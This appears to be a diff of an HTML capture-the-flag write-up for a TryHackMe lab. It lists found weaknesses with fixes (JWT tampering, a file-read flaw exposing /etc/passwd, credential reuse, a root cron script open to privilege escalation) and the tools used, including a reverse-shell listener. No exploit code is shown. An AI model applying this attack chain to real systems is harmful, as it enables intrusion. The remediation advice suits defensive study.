+<td style="text-align: left;"><strong>JWT Algorithm Weakness</strong></td>
+<td style="text-align: left;">Payload can be modified; signature not properly validated for role changes.</td>
+<td style="text-align: left;">Validate JWT signatures server-side on every request. Use asymmetric signing (RS256) where possible.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>LFI via <code>/api/files.php</code></strong></td>
+<td style="text-align: left;">Arbitrary file read on the server, leaking <code>config.php</code>, <code>/etc/passwd</code>, etc.</td>
+<td style="text-align: left;">Restrict file access to a whitelist of allowed paths. Never pass user input directly to file operations.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>AES Key in JS Source</strong></td>
+<td style="text-align: left;">Allows decrypting backup configuration files.</td>
+<td style="text-align: left;">Store encryption keys in server-side secret management (Vault, AWS KMS).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Credential Reuse (DB password = SSH password)</strong></td>
+<td style="text-align: left;">Database password <code>********</code> also works for SSH as <code>devops</code>.</td>
+<td style="text-align: left;">Use unique credentials for each service. Implement SSH key-based authentication.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Writable Cron Script by Non-Root User</strong></td>
+<td style="text-align: left;"><code>devops</code> can modify <code>health_report.sh</code> which runs as root — trivial privesc.</td>
+<td style="text-align: left;">Cron scripts executed as root must be owned and writable <strong>only</strong> by root (<code>chmod 700</code>, <code>chown root:root</code>).</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-tools-used">8. Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Nmap</strong></td>
+<td style="text-align: left;">Port scanning and service enumeration</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Gobuster</strong></td>
+<td style="text-align: left;">Directory brute-forcing</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hydra</strong></td>
+<td style="text-align: left;">HTTP form password brute-force</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>curl</strong></td>
+<td style="text-align: left;">API interaction (JWT, LFI)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Base64 Decoder</strong></td>
+<td style="text-align: left;">Decoding and re-encoding JWT payloads</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>OpenSSL</strong></td>
+<td style="text-align: left;">Decrypting AES-128-ECB encrypted backup config</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>pspy64</strong></td>
+<td style="text-align: left;">Monitoring cron jobs running as root</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Penelope</strong></td>
+<td style="text-align: left;">Enhanced reverse shell listener</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>nano</strong></td>
+<td style="text-align: left;">Editing the writable cron script</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SSH</strong></td>
+<td style="text-align: left;">Remote login as <code>devops</code></td>
+</tr>
+</tbody>
+</table>
+    </div>
+  </main>
 
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>Gobuster</code></li>
-      <li><code>Hydra</code></li>
-      <li><code>curl</code></li>
-      <li><code>OpenSSL</code></li>
-      <li><code>pspy64</code></li>
-      <li><code>Penelope</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
